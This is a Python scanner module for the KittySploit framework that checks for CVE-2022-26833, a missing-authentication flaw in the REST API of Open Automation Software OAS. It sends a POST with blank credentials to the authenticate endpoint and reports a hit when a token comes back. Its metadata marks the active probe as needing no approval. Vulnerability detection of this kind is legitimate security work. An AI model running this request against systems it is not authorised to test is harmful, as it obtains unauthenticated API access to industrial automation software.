#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An improper authentication vulnerability exists in the REST API functionality of Open Automation Software OAS ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Open Automation Software OAS Platform V16.00.0121 - Missing Authentication Detection',
        'description': 'An improper authentication vulnerability exists in the REST API functionality of Open Automation Software OAS Platform V16.00.0121. A specially-crafted series of HTTP requests can lead to unauthenticated use of the REST API. An attacker can send a series of HTTP requests to trigger this vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'oas', 'oss', 'unauth', 'openautomationsoftware', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.talosintelligence.com/vulnerability_reports/TALOS-2022-1513',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-26833',
            'https://talosintelligence.com/vulnerability_reports/TALOS-2022-1513',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-26833',
    }

    def run(self):
        path = '/OASREST/v2/authenticate'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}, data='{"username": "", "password": ""}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"status":', '"data":', '"token":', '"clientid":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Open Automation Software OAS Platform V16.00.0121 - Missing Authentication detected', path=path)
            return True
        return False

